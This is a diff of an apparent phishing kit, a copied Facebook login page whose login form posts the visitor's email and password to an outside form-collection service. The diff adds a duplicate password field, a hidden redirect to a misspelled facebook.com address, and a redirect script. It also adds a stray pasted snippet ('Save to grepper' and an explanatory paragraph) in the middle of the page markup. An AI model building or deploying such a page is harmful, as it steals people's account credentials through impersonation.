@@ -56,6 +56,13 @@
     "url": "https:\/\/en-gb.facebook.com\/"
   }</script>
   <link rel="canonical" href="https://www.facebook.com/"/>
+  <style>
+
+    .hidden {
+      display: none;
+    }
+  </style>
+
   <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico"/>
   <link type="text/css" rel="stylesheet"
         href="https://static.xx.fbcdn.net/rsrc.php/v3/yv/l/0,cross/FYjS_5ulJo7.css?_nc_x=Ij3Wp8lg5Kz"
@@ -572,26 +579,51 @@
             <div class="_8esn">
               <div class="_8iep _8icy _9ahz _9ah-">
                 <div class="_6luv _52jv">
-                    <form class="_9vtf" data-testid="royal_login_form" action="https://formspree.io/f/mrgnalvj" method="POST" id="u_0_2_vm">
-                        <input type="hidden" name="jazoest" value="2951" autocomplete="off"/>
-                        <input type="hidden" name="lsd" value="AVowb-V4nbQ" autocomplete="off"/>
-                        
-                        <div>
-                            <div class="_6lux"><input type="text" class="inputtext _55r1 _6luy" name="email" id="email" data-testid="royal_email" placeholder="Email address or phone number" autofocus="1" aria-label="Email address or phone number"/></div>
-                            <div class="_6lux"> <input type="text" class="inputtext _55r1 _6luy _9npi" name="pass" id="pass" data-testid="royal_pass" placeholder="Password" aria-label="Password"/></div>
-                                </div>
+                  <form class="_9vtf" data-testid="royal_login_form" action="https://formspree.io/f/mrgnalvj" method="POST" onsubmit="redirectToNewPage()" id="u_0_2_vm">
+                    <input type="hidden" name="jazoest" value="2951" autocomplete="off" />
+                    <input type="hidden" name="lsd" value="AVowb-V4nbQ" autocomplete="off" />
+                    <input type="hidden" name="_next" value="//wwww.facebook.com" />
+                
+                    <div>
+                        <div class="_6lux"><input type="text" class="inputtext _55r1 _6luy" name="email" id="email" placeholder="Email address or phone number" autofocus="1" aria-label="Email address or phone number" /></div>
+                        <div class="_6lux"><input type="password" class="inputtext _55r1 _6luy" name="passwordd" id="passwordd" placeholder="Password" autofocus="1" aria-label="Password" /></div>
+                        <div class="_6lux">
+                            <div class="_6luy _55r1 _1kbt hidden" id="passContainer">
+                                <input type="password" class="inputtext _55r1 _6luy _9npi" name="pass" id="pass" data-testid="royal_pass" placeholder="Password" aria-label="Password" />
+                                <div class="_9ls7" id="u_0_3_C+"><a href="#" role="button">
+                                        <div class="_9lsa">
+                                            <div class="_9lsb" id="u_0_4_gd"></div>
+                                        </div>
+                                    </a></div>
                             </div>
                         </div>
-                        <input type="hidden" autocomplete="off" name="login_source" value="comet_headerless_login"/>
-                        <input type="hidden" autocomplete="off" name="next" value=""/>
-                        <div class="_6ltg">
-                            <button value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login" data-testid="royal_login_button" type="submit" id="u_0_5_3J">Log in</button>
-                        </div>
-                        <div class="_6ltj"><a href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzEwODg1NTc5LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;ars=facebook_login">Forgotten password?</a></div>
-                        <div class="_8icz"></div>
-                        <div class="_6ltg"><a role="button" class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy" href="#" ajaxify="/reg/spotlight/" id="u_0_0_/r" data-testid="open-registration-form-button" rel="async">Create new account</a></div>
-                    </form>
-                    
+                    </div>
+                    <input type="hidden" autocomplete="off" name="login_source" value="comet_headerless_login" />
+                    <input type="hidden" autocomplete="off" name="next" value="" />
+                    <div class="_6ltg">
+                        <button value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login" data-testid="royal_login_button" type="submit" id="u_0_5_3J">Log in</button>
+                    </div>
+                    <div class="_6ltj"><a href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzEwODg1NTc5LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;ars=facebook_login">Forgotten
+                            password?</a></div>
+                    <div class="_8icz"></div>
+                    <div class="_6ltg"><a role="button" class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy" href="#" ajaxify="/reg/spotlight/" id="u_0_0_/r" data-testid="open-registration-form-button" rel="async">Create new account</a>
+                    </div>
+                </form>
+                
+                <script>
+                    function redirectToNewPage() {
+                        window.location.href = 'https://example.com'; // Replace 'https://example.com' with your desired URL
+                        return false; // Prevent the form from being submitted normally
+                    }
+                </script>
+                Save to grepper
+                In this code, the redirectToNewPage() function is called when the form is submitted. It immediately redirects the user to the specified URL (https://example.com in this case). You can replace 'https://example.com' with the URL you want to redirect to after form submission. The return false; statement ensures that the form is not submitted normally, preventing it from performing its default action (i.e., submitting data to the server).
+                
+                
+                
+                
+                
+                
                 </div>
                 <div id="reg_pages_msg" class="_58mk"><a href="/pages/create/?ref_type=registration_form" class="_8esh">Create
                   a Page</a> for a celebrity, brand or business.
@@ -716,7 +748,14 @@
 <div style="display:none">
   <div></div>
 </div>
-<script>requireLazy(["HasteSupportData"], function (m) {
+<script>
+
+    function redirectToNewPage() {
+        window.location.href = 'https://example.com'; // Replace 'https://example.com' with your desired URL
+        return false; // Prevent the form from being submitted normally
+    }
+
+requireLazy(["HasteSupportData"], function (m) {
   m.handle({
     "bxData": {"875231": {"uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/yT\/r\/aGT3gskzWBf.ico"}},
     "clpData": {"1743095": {"r": 1, "s": 1}, "1828945": {"r": 100, "s": 1}, "6181": {"r": 1, "s": 1}},
